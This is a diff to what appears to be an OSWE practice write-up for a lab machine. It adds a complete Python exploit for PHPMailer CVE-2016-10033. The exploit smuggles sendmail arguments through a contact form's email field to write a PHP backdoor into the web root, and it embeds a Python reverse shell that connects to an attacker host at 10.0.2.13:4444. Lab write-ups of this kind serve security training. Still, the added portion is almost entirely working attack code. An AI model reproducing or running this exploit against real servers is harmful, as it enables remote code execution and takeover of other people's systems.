@@ -94,6 +94,54 @@ It did require a bunch of tweaking, not just the IP and port, but it finally con
 
 ![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/113da3ae-48bd-468a-bb5e-a85bd1faad7f)
 
+Here is my final script
+
+````
+from requests_toolbelt import MultipartEncoder
+import requests
+import os
+import base64
+from lxml import html as lh
+
+os.system('clear')
+print("\n")
+print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
+print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
+print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
+print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
+print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
+print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
+print("      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com")
+print(" Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski\n")
+
+target = 'http://10.0.2.36/'
+direc='contact.php'
+backdoor = '/backdoor.php'
+
+payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'10.0.2.13\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
+fields={'action': 'submit',
+        'name': payload,
+        'email': '"anarcoder\\" -oQ/tmp/ -X/var/www/html/backdoor.php server"@protonmail.com',
+	'subject': 'test',
+        'message': 'Pwned'}
+
+m = MultipartEncoder(fields=fields,
+                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')
+
+headers={'User-Agent': 'curl/7.47.0',
+         'Content-Type': m.content_type}
+
+proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}
+
+
+print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
+r = requests.post(target+direc, data=m.to_string(),
+                  headers=headers)
+print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
+r = requests.get(target+backdoor, headers=headers)
+if r.status_code == 200:
+    print('[+]  ExPLoITeD ' + target)
+````
 
 ## Privilege Escalation
 
